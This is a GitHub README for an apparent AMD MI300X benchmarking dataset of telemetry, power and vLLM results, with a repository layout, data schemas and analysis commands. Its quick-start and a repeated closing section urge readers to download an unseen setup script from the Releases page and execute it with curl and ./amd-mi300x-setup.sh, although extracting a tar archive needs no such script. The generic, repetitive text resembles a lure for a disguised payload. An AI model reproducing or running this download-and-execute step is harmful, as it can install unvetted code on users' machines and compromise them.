# AMD MI300X Research Data — ML Benchmarks, Telemetry & Power

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/manuadi119/amd-mi300x-research-data/releases)

![Server rack GPU image](https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1600&q=60)

High-quality, reproducible datasets and artifacts from systematic ML benchmarking on AMD MI300X. This repo stores raw telemetry, processed metrics, and the analysis pipeline used for training and inference workloads. Use the data to compare models, test power-efficiency strategies, or reproduce vLLM and distributed training experiments.

Table of contents
- Overview
- Quick start (download & run)
- Repository layout
- Data schema and file formats
- Benchmarks and workloads
- Telemetry and metrics
- Reproducibility and artifacts
- Hardware and testbed
- Example workflows
- Analysis tools and scripts
- How to cite and license
- Contributors

Overview
This repository collects telemetry and benchmark outputs produced on AMD MI300X GPUs installed in Dell PowerEdge servers. It covers:
- Training runs across common model families (transformers, CNNs).
- Inference profiles using vLLM and batch-serving scenarios.
- Power, thermal, and utilization telemetry sampled at high resolution.
- Processed metrics and reproducible notebooks for analysis.

Quick start (download & run)
Visit the Releases page and download the release asset. The release contains a prepared archive and an installer script that you need to download and execute to extract datasets and set up analysis artifacts.

Direct link:
https://github.com/manuadi119/amd-mi300x-research-data/releases

Typical steps (example)
1. Open the Releases page above and download the latest asset named `amd-mi300x-data-v1.tar.gz` and the script `amd-mi300x-setup.sh`.
2. On your machine, run:
```
curl -L -o amd-mi300x-data-v1.tar.gz "https://github.com/manuadi119/amd-mi300x-research-data/releases/download/v1/amd-mi300x-data-v1.tar.gz"
curl -L -o amd-mi300x-setup.sh "https://github.com/manuadi119/amd-mi300x-research-data/releases/download/v1/amd-mi300x-setup.sh"
chmod +x amd-mi300x-setup.sh
./amd-mi300x-setup.sh
```
The setup script extracts the dataset into `data/` and installs any light Python dependencies for the analysis notebooks. The Releases page includes checksums and changelog for each asset.

Repository layout
- data/
  - raw/
    - telemetry/            # Raw CSV, JSON or binary telemetry logs
    - perf_logs/            # per-run logs (stdout/stderr)
    - power/                # sampled power data (CSV)
  - processed/
    - metrics/              # aggregated metrics (JSON, Parquet)
    - system_profiles/      # CPU/GPU profiles
  - artifacts/
    - model_checkpoints/    # example checkpoints used for evaluation
    - vllm_configs/         # configs used for inference runs
- analysis/
  - notebooks/              # Jupyter notebooks for reproducible analysis
  - scripts/                # helper scripts (Python)
  - plots/                  # generated images and dashboards
- tools/
  - parse_telemetry.py      # parser for raw telemetry logs
  - compute_efficiency.py   # power and throughput analysis
  - run_jupyter.sh          # starts Jupyter with the right env
- metadata/
  - runs_manifest.csv       # one-line summary per run
  - hardware.yaml           # testbed hardware and firmware versions
- LICENSE
- README.md

Data schema and file formats
The dataset uses simple, documented formats to help reproducibility.

Telemetry (raw)
- Format: CSV or JSON lines
- Fields (sample):
  - timestamp (ISO 8601)
  - node_id
  - gpu_id
  - gpu_util_pct
  - gpu_mem_used_mb
  - host_cpu_pct
  - power_w
  - socket_temp_c
  - fan_rpm
- Sampling rate: 1 Hz and 100 Hz logs available for key runs.

Processed metrics
- Aggregated into Parquet and JSON files.
- Standard fields:
  - run_id
  - model
  - batch_size
  - sequence_length
  - throughput_samples_per_sec
  - latency_p50_ms
  - latency_p95_ms
  - energy_per_sample_j
  - average_power_w
  - wall_time_s

Benchmarks and workloads
This repo contains benchmark runs for both training and inference.

Training
- Models: ResNet variants, BERT, GPT-small and GPT-medium variants.
- Frameworks: PyTorch with ROCm support.
- Batch sizes: multiple sizes to demonstrate scaling.
- Metrics captured: epoch time, iteration time, GPU utilization, memory pressure, power.

Inference
- vLLM real-time and batch tests.
- Throughput and latency measurements across sequence lengths and client concurrency.
- Scenarios: single-GPU, multi-GPU inference, model sharding.

Telemetry and metrics
We collect telemetry at multiple layers:
- GPU counters (via ROCm metrics where available).
- System-level power (IPMI and PDUs).
- Wall-clock and application-level logs.

Metric examples:
- Energy per token/sample: computed from power trace over the inference window.
- Power efficiency: throughput divided by average power (samples/sec/W).
- Thermal behavior: temperature drift under sustained load.

Reproducibility and artifacts
We provide the following artifacts to help reproduce the published numbers:
- Raw logs for each run.
- A run manifest mapping run ids to config and artifact files.
- Dockerfile and a lightweight conda environment to reproduce the analysis environment.
- Jupyter notebooks that re-run aggregation and recreate plots.

Reproducible run example
1. Use the provided `docker/` folder or `environment.yml`.
2. Load the sample raw telemetry into `data/raw/telemetry/`.
3. Run the parser:
```
python tools/parse_telemetry.py --input data/raw/telemetry/run-123.log --out data/processed/metrics/run-123.parquet
```
4. Compute efficiency metrics:
```
python tools/compute_efficiency.py --metrics data/processed/metrics/run-123.parquet --out analysis/plots/run-123-efficiency.png
```

Hardware and testbed
We record full hardware metadata for each run:
- GPU: AMD MI300X — firmware, ROCm driver version, GPU microcode.
- Host: Dell PowerEdge R760xd — CPU model, BIOS version, memory config.
- Power measurement: PDU model and sampling rate.

Example hardware entry (metadata/hardware.yaml)
```
node_id: dp-edge-01
host: Dell PowerEdge R760xd
cpu: AMD EPYC Genoa 9654
gpus:
  - model: AMD MI300X
    id: GPU-0
    rocm: 5.7
pdu:
  model: APC-AP9561
  sampling_hz: 1
```

Example workflows
Inference with vLLM
- Use vLLM configs in `data/artifacts/vllm_configs/`.
- Launch a benchmark run using provided runner:
```
python analysis/scripts/run_vllm_inference.py --config data/artifacts/vllm_configs/gpt-medium.yaml --out results/vllm-gpt-medium.json
```
- Aggregate results:
```
python tools/compute_efficiency.py --metrics results/vllm-gpt-medium.json --out analysis/plots/vllm-gpt-medium.png
```

Training scale study
- Use sample training configs in `analysis/notebooks/`.
- Run distributed training with ROCm-enabled PyTorch.
- Collect logs and push to telemetry folder for aggregation.

Analysis tools and scripts
Key scripts:
- tools/parse_telemetry.py — normalize raw logs into a canonical schema.
- tools/compute_efficiency.py — compute throughput, energy per sample, and create CSV/JSON summaries.
- analysis/scripts/plot_latency.py — generate latency CDFs and histograms.
- analysis/scripts/run_validation.sh — quick validation that a run file matches the manifest.

Best practices
- Keep raw logs intact. Processed files may change but raw files prove provenance.
- Use run ids. The `runs_manifest.csv` binds runs to hardware, config, and artifacts.
- Re-run notebooks after installing the provided environment.

File naming conventions
- run-{YYYYMMDD}-{node}-{id}.log — raw application log.
- telemetry-{run_id}.csv — raw telemetry.
- metrics-{run_id}.parquet — processed metrics.
- artifact-{type}-{run_id}.tar.gz — saved artifacts and checkpoints.

Visualization and examples
The analysis notebooks generate:
- Throughput vs. power heatmaps.
- Latency percentiles across concurrency.
- Temperature drift plots over sustained load.
- ROC curves for model accuracy vs. energy use.

Images and badges
- Badges show CI and release links.
- Plots live in `analysis/plots/` and are available as PNG and SVG assets.

How to contribute
- Open issues for data quality, missing metadata, or suggestions.
- Fork the repo and submit PRs for parsers, analysis scripts, and notebook improvements.
- Follow the run manifest style when adding new runs.

Citation and academic use
Cite this dataset in papers that use its artifacts. Provide run ids in the Methods section. Example BibTeX entry:
```
@dataset{amd-mi300x-2025,
  title = {AMD MI300X Research Data},
  author = {Manuadi, et al.},
  year = {2025},
  url = {https://github.com/manuadi119/amd-mi300x-research-data/releases}
}
```

License
This repository uses the MIT License. See LICENSE for details.

Contact and credits
- Lead curator: Manuadi
- Contributors: engineering team, systems admins, and data analysts
- For questions, open an issue or submit a pull request.

Releases and downloads (again)
Visit the Releases page to download data and the setup script. Download the release asset and execute the included setup script to extract data and prepare the analysis environment:
https://github.com/manuadi119/amd-mi300x-research-data/releases

Tags / Topics
ai-hardware, amd-mi300x, benchmark-data, deep-learning, dell-poweredge, gpu-computing, power-efficiency, reproducible-research, research-dataset, vllm